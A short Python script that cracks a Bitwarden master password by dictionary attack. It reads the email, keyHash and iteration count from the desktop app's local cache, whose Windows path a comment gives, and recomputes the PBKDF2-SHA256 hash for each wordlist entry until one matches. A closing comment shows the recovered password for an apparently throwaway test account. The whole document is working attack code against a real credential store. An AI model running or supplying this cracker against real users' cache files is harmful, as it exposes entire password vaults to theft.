import hashlib
import json
import base64


def crack(email, keyHash, iterations, wordlist):
    email = email.lower().encode()  # make email lowercase and encode it to utf-8 (byte string)
    wordlist = [i.rstrip("\n") for i in open(wordlist)]  # convert wordlist to array
    for passphrase in wordlist:
        passphrase = passphrase.encode()
        pepper = hashlib.pbkdf2_hmac("sha256", passphrase, email, iterations, None)
        possibleKeyHash = hashlib.pbkdf2_hmac("sha256", pepper, passphrase, 1, None)
        possibleKeyHash = base64.b64encode(possibleKeyHash).decode()  # base64 encode possibleKeyHash and make it a regular string

        if possibleKeyHash == keyHash:
            return "Found password: {} : {}".format(keyHash, passphrase.decode())


def getData():
    with open("data.json") as f:  # some unnecessary entries were removed from Windows 10 App, found in %userprofile%\AppData\Local\Packages\8bitSolutionsLLC.bitwardendesktop_h4e712dmw3xyy\LocalCache\Roaming\Bitwarden
        data = json.load(f)
    email = data["userEmail"]  # 10minutemail.com
    keyHash = data["keyHash"]
    iterations = data["kdfIterations"]
    return email, keyHash, iterations


print(crack(*getData(), "wordlist.txt"))
# correct password: hashcat123
